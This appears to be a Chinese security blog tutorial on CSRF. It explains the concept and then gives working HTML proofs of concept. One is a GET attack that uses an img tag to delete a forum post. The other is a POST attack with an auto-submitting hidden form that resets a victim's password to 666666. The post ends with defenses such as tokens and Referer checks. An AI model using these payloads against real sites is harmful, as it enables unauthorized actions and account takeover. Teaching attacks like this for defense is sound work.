---
draft: false
date: 2016-06-28 09:21:34
title: CSRF 漏洞
description: 
categories:
  - Pentest
tags:
  - csrf
---

### 0x00 概念
当你登陆某个网站时，通常浏览器与网站都会形成一个会话，在会话没有结束时你可以执行发表文章、发邮件、删除文章等操作，若会话结束，你再操作的话会提示你会话已经结束，请重新登陆。  

CSRF就是：攻击者通过一些技术手段欺骗用户的<font color="FF0000">浏览器</font>去<font color="FF0000">访问</font>一个自己曾<font color="FF0000">认证过</font>的网站并<font color="FF0000">执行某些操作</font>。也可以说CSRF就是黑客利用受害者的Cookie骗取服务器的信任从而执行某些操作

### 0x01 利用
* 利用条件
    * 攻击者可以得知url的所有参数项并了解其含义
    * 诱导用户访问构造好的POC

* 利用地方
    * 操作是有意义的(比如:修改密码等)
    * 验证过于简单(参数固定、我们可以设置参数)

### 0x02 GET型CSRF攻击
```
若有论坛www.aa.com，论坛删除文章的操作是请求类似
http://www.aa.com/opt.php?id=135&act=del&name=Tom的链接
```
```
有用户A，他登陆了论坛，且有篇文章id为251，那么他的浏览器此时已经取得了论坛的信任
```
```
此时有hacker用户B，他构造了一个html为b.html，b.html内容如下：
<html>
<head>
    <title>test</title>
</head>
<body>
    <img src="http://www.aa.com/opt.php?id=251&act=del&name=A" />
</body>
</html>
将b.html放在他自己搭建的网站上，网址为http://www.bb.com/b.html
```
```
恶意用户B将链接http://www.bb.com/b.html通过qq发送给用户A，
诱使他访问，用户A一旦访问，他id为251的文章就会被删除
```

### 0x03 POST型CSRF攻击
若网站www.xx.com有让用户修改密码的功能，但验证过于简单，形如下图：
![csrf_post利用](/img/post/csrf_post.png)
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>aa</title>
</head>
<body>
    <form action="http://172.23.10.200/setpasswd.php" method="post">
        昵称：<input type="text" name="nickname" id="nickname" value="xxxxx">
        用户名：<input type="text" name="name" id="name" value="xiaoming">
        密码：<input type="passwd" name="passwd" id="passwd" value="">
        确认密码：<input type="rpasswd" name="rpasswd" id="rpasswd" value="">
        <input type="submit" name="button" value="提交">
    </form>
</body>
</html>
```
此时我们就可以构造自动提交表单的xxxx.html，内容如下：
```html
<html>
<head>
    <title>aa</title>
</head>
<body>
    <form name="csrf" action="http://172.23.10.200/setpasswd.php" method="post">
        <input type="hidden" name="passwd" id="passwd" value="666666">
        <input type="hidden" name="rpasswd" id="rpasswd" value="666666">
    </form>
    <script>
        setTimeout("document.csrf.submit()",100);
    </script>
</body>
</html>
```
然后将连接```http://www.bb.com/xxxx.html``` 发送给用户,诱使他点击链接,一旦他点击,则密码就会被修改

### 0x04 防御：
* 验证Referer
* 对于修改密码的表单可以要求输入原密码  
* 二次确认(如删除用户、转账等重要操作弹窗要求用户确认)
* Token认证  
    * GET操作请求：可以在Cookie中存储Token  
    * POST操作请求：可以在form表单中添加一个隐藏的input标签，value值为Token
    * 在header中添加自定义参数携带token
